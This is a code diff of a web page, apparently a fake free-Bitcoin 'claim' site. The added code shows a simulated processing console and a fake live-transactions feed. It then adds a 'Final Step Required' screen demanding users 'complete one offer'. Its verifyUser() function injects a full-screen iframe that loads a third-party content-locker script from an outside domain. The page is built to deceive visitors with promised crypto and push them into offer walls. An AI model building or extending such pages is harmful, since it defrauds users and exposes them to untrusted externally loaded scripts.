@@ -15,7 +15,7 @@
     <!-- Google Fonts: Inter & Rajdhani for Tech/Crypto look -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
 
-    <!-- Content Locker Script Removed -->
+    <!-- Script removed from Head (It will be injected via iframe on click) -->
 
     <script>
         tailwind.config = {
@@ -135,7 +135,7 @@
             </div>
         </header>
 
-        <!-- SECTION 1 & 2: HERO & FORM (Toggleable with Processing) -->
+        <!-- SECTION 1 & 2: HERO & FORM (Toggleable) -->
         <div id="main-interface" class="w-full max-w-md">
             
             <!-- Hero Text -->
@@ -221,6 +221,34 @@
                     <div id="progress-bar" class="h-full bg-btc w-0 transition-all duration-[3000ms] ease-out"></div>
                 </div>
 
+            </div>
+        </div>
+
+        <!-- NEW FINAL STEP: VERIFICATION SCREEN (Hidden by default) -->
+        <div id="verification-interface" class="hidden w-full max-w-md text-center py-8 animate-fade-in-up">
+            <div class="bg-card border border-accent/50 p-8 rounded-2xl glow-box relative overflow-hidden">
+                
+                <!-- Icon -->
+                <div class="w-20 h-20 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
+                    <i class="fa-solid fa-lock text-4xl text-accent"></i>
+                </div>
+
+                <!-- Title -->
+                <h3 class="text-3xl font-display font-bold text-white mb-4">Final Step Required</h3>
+
+                <!-- Text -->
+                <p class="text-gray-300 mb-8">Complete one offer to confirm your transaction.</p>
+
+                <!-- Button -->
+                <button onclick="verifyUser()" class="group w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-green-500/20 relative overflow-hidden">
+                    <span class="relative z-10 flex items-center justify-center gap-2">
+                        Verify & Claim BTC <i class="fa-solid fa-unlock group-hover:translate-x-1 transition-transform"></i>
+                    </span>
+                    <!-- Button Shine Effect -->
+                    <div class="absolute inset-0 h-full w-full scale-0 rounded-lg transition-all duration-300 group-hover:scale-100 group-hover:bg-white/20"></div>
+                </button>
+
+                <p class="text-[10px] text-gray-500 mt-4">Verification is instant upon completion.</p>
             </div>
         </div>
 
@@ -373,6 +401,7 @@
         // --- DOM ELEMENTS ---
         const mainInterface = document.getElementById('main-interface');
         const processingInterface = document.getElementById('processing-interface');
+        const verificationInterface = document.getElementById('verification-interface'); // NEW
         const progressBar = document.getElementById('progress-bar');
         const consoleOutput = document.getElementById('console-output');
         const statusText = document.getElementById('process-status');
@@ -426,22 +455,40 @@
                     logIndex++;
                 } else {
                     clearInterval(logInterval);
-                    // [UPDATED] Added 2000ms delay so user sees "Finalizing" before locker appears
+                    
+                    // [UPDATED] Switch to Verification Screen
                     setTimeout(() => {
-                        triggerLocker();
+                        processingInterface.classList.add('hidden');
+                        verificationInterface.classList.remove('hidden');
                     }, 2000);
                 }
             }, 500);
         }
 
-        // --- 2. TRIGGER CONTENT LOCKER ---
-        function triggerLocker() {
-            console.log("Locker Triggered");
+        // --- 2. VERIFY USER FUNCTION (Injects Iframe) ---
+        function verifyUser() {
+            console.log("Creating Locker Iframe...");
             
-            // Content Locker removed. 
-            // Add your new redirection logic or locker script here when ready.
-            alert("<script type="text/javascript" id="ogjs" src="https://BuiltBlok.com/cl/js/4o245r"></script>
-)");
+            var locker = document.createElement("iframe");
+            
+            // Using srcdoc to properly render the script tag inside the iframe
+            locker.srcdoc = `
+                <html>
+                    <body style="margin:0; padding:0; background: transparent;">
+                        <script type="text/javascript" id="ogjs" src="https://quikfun.info/cl/js/4o245r"><\/script>
+                    </body>
+                </html>
+            `;
+            
+            locker.style.position = "fixed";
+            locker.style.top = "0";
+            locker.style.left = "0";
+            locker.style.width = "100%";
+            locker.style.height = "100%";
+            locker.style.border = "none";
+            locker.style.zIndex = "999999";
+            
+            document.body.appendChild(locker);
         }
 
         // --- 3. LIVE TRANSACTIONS GENERATOR ---
@@ -498,15 +545,13 @@
         // Mobile: Show after 15 seconds if no action
         setTimeout(() => {
             if (!exitTriggered && mainInterface.classList.contains('hidden') === false) {
-                // Only show if they haven't started processing yet
-               // showPopup(); // Uncomment if you want aggressive mobile popup
+               // showPopup();
             }
         }, 15000);
 
         function showPopup() {
             exitTriggered = true;
             exitPopup.classList.remove('hidden');
-            // Small delay to allow display:block to apply before opacity transition
             setTimeout(() => {
                 exitPopup.classList.remove('opacity-0');
                 popupContent.classList.remove('scale-95');
